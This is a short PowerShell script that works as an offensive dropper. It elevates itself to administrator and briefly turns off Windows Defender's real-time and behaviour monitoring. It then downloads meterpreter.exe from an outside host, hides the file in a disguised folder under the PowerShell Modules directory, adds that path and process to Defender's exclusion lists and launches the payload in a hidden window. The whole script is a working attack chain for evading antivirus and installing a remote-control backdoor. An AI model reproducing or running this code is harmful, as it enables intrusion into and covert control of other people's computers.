# Check for Administrator Privileges
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    Exit
}

# Temporarily Disable Windows Defender Components
Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true -DisablePrivacyMode $true -SignatureDisableUpdateOnStartupWithoutEngine $true

# Download the executable file
$sourceUrl = "http://10.0.2.4/meterpreter.exe"
$destinationPath = "C:\Program Files (x86)\WindowsPowerShell\Modules\temp\meterpreter.exe"

# Ensure the Temp directory exists
if (-not (Test-Path "C:\Program Files (x86)\WindowsPowerShell\Modules\Temp")) {
    New-Item -Path "C:\Program Files (x86)\WindowsPowerShell\Modules\Temp" -ItemType Directory
}

Invoke-WebRequest -Uri $sourceUrl -OutFile $destinationPath

# Hide the executable file
Set-ItemProperty -Path $destinationPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

# Add the executable file and its directory to the Windows Defender exclusion list
Add-MpPreference -ExclusionPath "C:\Program Files (x86)\WindowsPowerShell\Modules\temp\"
Add-MpPreference -ExclusionProcess "$destinationPath"

# Re-enable Windows Defender Components without delay
Set-MpPreference -DisableRealtimeMonitoring $false -DisableBehaviorMonitoring $false -DisableBlockAtFirstSeen $false -DisableIOAVProtection $false -DisablePrivacyMode $false -SignatureDisableUpdateOnStartupWithoutEngine $false

# Run the executable file in the background
Start-Process -FilePath $destinationPath -WindowStyle Hidden
